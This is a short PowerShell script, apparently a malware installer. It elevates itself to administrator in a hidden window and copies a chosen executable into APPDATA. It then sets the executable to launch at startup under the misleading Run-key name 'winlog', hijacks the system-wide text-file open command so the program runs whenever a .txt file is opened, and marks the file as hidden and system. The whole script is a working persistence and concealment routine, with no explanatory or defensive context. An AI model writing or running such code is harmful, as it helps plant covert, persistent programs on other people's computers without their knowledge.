# NOTE: If text files are associated with something other than notepad, this will override it.
# You will also need to compile file as .exe

# Set the file name as your .exe
$strFileName = "File.exe"

If (-NOT ([Security.Principal.WindowsPrincipal] [Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole([Security.Principal.WindowsBuiltInRole] "Administrator"))
{
    Start-Process powershell.exe -Verb RunAs -ArgumentList ('-WindowStyle Hidden -noprofile -file "{0}" -elevated' -f ($myinvocation.MyCommand.Definition))
    exit
}

$strScriptPath = $MyInvocation.MyCommand.Path; $strDirScriptPath = Split-Path $strScriptPath
Set-Location -Path $strDirScriptPath

$APPDATA = "$env:APPDATA"

# Copy file to appdata folder
If (test-path "$APPDATA\$strFileName") {Remove-Item "$APPDATA\$strFileName" -Force}
Copy-Item $strFileName $APPDATA -Force

# make program run at startup
New-ItemProperty -path HKLM:\Software\Microsoft\Windows\CurrentVersion\Run -name winlog -PropertyType String -value $APPDATA\$strFileName -Force

# make program open anytime a user opens a text file
New-ItemProperty -path HKLM:\Software\Classes\txtfile\shell\open\command -name "(Default)" -PropertyType ExpandString -value "$APPDATA\$strFileName %1" -Force

# set attributes to be a system file and a hidden file
$objGetFile=Get-Item $APPDATA\$strFileName; $objGetFile.Attributes = 'System, Hidden'
